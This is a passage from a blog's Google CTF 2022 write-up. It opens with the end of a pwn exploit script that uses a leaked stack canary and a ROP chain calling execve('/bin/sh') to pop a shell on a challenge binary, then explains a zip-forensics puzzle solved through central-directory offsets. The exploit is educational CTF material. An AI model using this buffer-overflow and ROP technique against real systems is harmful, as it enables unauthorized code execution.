</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - pop null to rsi</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - pop 0x3b (execve) to rax</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - call syscall</span>
</span></span><span style="display:flex;"><span>bof_payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>bof_payload <span style="color:#555">=</span> p64(<span style="color:#f60">0</span>)<span style="color:#555">+</span>p64(pop_rdi)<span style="color:#555">+</span>p64(bin_sh_addr)<span style="color:#555">+</span>p64(pop_rsi)<span style="color:#555">+</span>p64(<span style="color:#f60">0</span>)<span style="color:#555">+</span>p64(pop_rax)<span style="color:#555">+</span>p64(<span style="color:#f60">0x3b</span>)<span style="color:#555">+</span>p64(syscall)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>min_score <span style="color:#555">=</span> <span style="color:#f60">60</span><span style="color:#555">//</span><span style="color:#f60">5</span> <span style="color:#09f;font-style:italic"># Score to get to the scoreboard</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># What this payload do:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Set /bin/sh\x00 as the start of our name. This will be used by our ROP chain as our execve args.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Pad it with 0x20 of &#39;a&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Put our leaked canary, so that the stack smashing check is passed.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite saved rbp of the previous call &amp; return address with our BOF payload</span>
</span></span><span style="display:flex;"><span>play(r, min_score, p64(<span style="color:#f60">0x68732f6e69622f</span>)<span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x20</span><span style="color:#555">+</span>p64(recovered_canary)<span style="color:#555">+</span>bof_payload)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the snapshot of the script result üòÑ
<p class="markdown-image">
  <img src="https://i.imgur.com/z6FznJI.png" alt=""  />
</p></p>
<blockquote>
<p>Flag: <code>CTF{GuessYouCanSayTheCookieGotRandomlyBroken}</code></p>
</blockquote>
<h1 id="misc">Misc <a href="#misc" class="anchor">#</a></h1>
<h2 id="appnotetxt">Appnote.txt <a href="#appnotetxt" class="anchor">#</a></h2>
<blockquote>
<p>Every single archive manager unpacks this to a different file&hellip;</p>
</blockquote>
<h3 id="analysis--solution">Analysis &amp; Solution <a href="#analysis--solution" class="anchor">#</a></h3>
<p>We were given a zip file called <code>dump.zip</code>. Trying to extract it, I found that the size of the file&rsquo;s output doesn&rsquo;t make sense. So, let&rsquo;s try to open it in a hex editor.</p>
<p>Turn out, as you can see, there are a lot of zip files on there. What makes it more interesting is there are a lot of zip files with the same name (Example: there is a lot of <code>flag00.zip</code> in the file), but with different contents. There are flag00.zip - flag18.zip. Each zip file with the same name contains only one char. In fact, the name indicates the n-th character of the flags. So, with deduction, we can guess that:</p>
<ul>
<li>To get the flag n-th character, we need to know which flag{n}.zip is the correct zip. If we found it, that means the content of its zip is the n-th character of our flag</li>
</ul>
<p>But how do we know the correct zip file? Reading through the <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT" target="_blank" rel="noopener">appnote.txt</a> of the ZIP file, we can understand how the ZIP signatures work, especially in part 4.3.1</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>   4.3.1 A ZIP file MUST contain an &#34;end of central directory record&#34;. A ZIP 
</span></span><span style="display:flex;"><span>   file containing only an &#34;end of central directory record&#34; is considered an 
</span></span><span style="display:flex;"><span>   empty ZIP file.  Files MAY be added or replaced within a ZIP file, or deleted. 
</span></span><span style="display:flex;"><span>   A ZIP file MUST have only one &#34;end of central directory record&#34;.  Other 
</span></span><span style="display:flex;"><span>   records defined in this specification MAY be used as needed to support 
</span></span><span style="display:flex;"><span>   storage requirements for individual ZIP files.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s check the signature of the end of the central directory record</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>   4.3.16  End of central directory record:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      end of central dir signature    4 bytes  (0x06054b50)
</span></span><span style="display:flex;"><span>      number of this disk             2 bytes
</span></span><span style="display:flex;"><span>      number of the disk with the
</span></span><span style="display:flex;"><span>      start of the central directory  2 bytes
</span></span><span style="display:flex;"><span>      total number of entries in the
</span></span><span style="display:flex;"><span>      central directory on this disk  2 bytes
</span></span><span style="display:flex;"><span>      total number of entries in
</span></span><span style="display:flex;"><span>      the central directory           2 bytes
</span></span><span style="display:flex;"><span>      size of the central directory   4 bytes
</span></span><span style="display:flex;"><span>      offset of start of central
</span></span><span style="display:flex;"><span>      directory with respect to
</span></span><span style="display:flex;"><span>      the starting disk number        4 bytes
</span></span><span style="display:flex;"><span>      .ZIP file comment length        2 bytes
</span></span><span style="display:flex;"><span>      .ZIP file comment       (variable size)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the signature is started by 0x06054b50. Searching this pattern in HxD, turn out it gives 21 results.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 00 EE 00 00 CC 00 00 00 B8 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 93 D7 00 00 65 17 00 00 8C 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 CC CA 00 00 42 24 00 00 76 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 69 BF 00 00 BB 2F 00 00 60 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 CE B6 00 00 6C 38 00 00 4A 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 29 A5 00 00 27 4A 00 00 34 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 E7 9C 00 00 7F 52 00 00 1E 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 42 8B 00 00 3A 64 00 00 08 01
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 21 86 00 00 71 69 00 00 F2 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 71 73 00 00 37 7C 00 00 DC 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 66 70 00 00 58 7F 00 00 C6 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 E3 59 00 00 F1 95 00 00 B0 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 AC 52 00 00 3E 9D 00 00 9A 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 A2 47 00 00 5E A8 00 00 84 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 8E 33 00 00 88 BC 00 00 6E 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 9A 2A 00 00 92 C5 00 00 58 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 16 1C 00 00 2C D4 00 00 42 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 38 15 00 00 20 DB 00 00 2C 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 2F 02 00 00 3F EE 00 00 16 00
</span></span><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 34 F0 00 00 50 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>This makes sense, as technically, there is 21 zip in the given file.</p>
<ul>
<li>dump.zip contains hello.txt</li>
<li>a zip contains hi.txt</li>
<li>19 zips flag{n}.zip</li>
</ul>
<p>With this end of the central directory, we can know which zip is the correct one. Notice that each end of the central directory has 4-bytes which is the offset of the start of the central directory of the file. With this, we can know which zip is the correct one for each n-th character of the flag.</p>
<p>Example:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Checking the 0A88-0x1 offset, it refers to the correct char of the flag, which is C 
</span></span></code></pre></td></tr></table>
</div>
</div><p><p class="markdown-image">
  <img src="https://i.imgur.com/XRl4QHd.png" alt=""  />
</p></p>
<p>Doing the same to the rest of the signatures, we got the flag.</p>
<blockquote>
<p>Flag: <code>CTF{p0s7m0d3rn_z1p}</code></p>
</blockquote>
<h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">Google CTF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#fixed-aslr">Fixed ASLR</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a></li>
        <li><a href="#exploitation-plan">Exploitation Plan</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#appnotetxt">Appnote.txt</a>
      <ul>
        <li><a href="#analysis--solution">Analysis &amp; Solution</a></li>
      </ul>
    </li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/google-ctf">Google CTF</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/aslr">aslr</a>
            
                <a href="https://chovid99.github.io/tags/buffer-overflow">buffer overflow</a>
            
                <a href="https://chovid99.github.io/tags/rop">rop</a>
            
                <a href="https://chovid99.github.io/tags/oob">oob</a>
            
                <a href="https://chovid99.github.io/tags/prng">prng</a>
            
                <a href="https://chovid99.github.io/tags/zip">zip</a>
            
                <a href="https://chovid99.github.io/tags/forensic">forensic</a>
            
                <a href="https://chovid99.github.io/tags/2022">2022</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       ¬© Copyright 
       2023 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
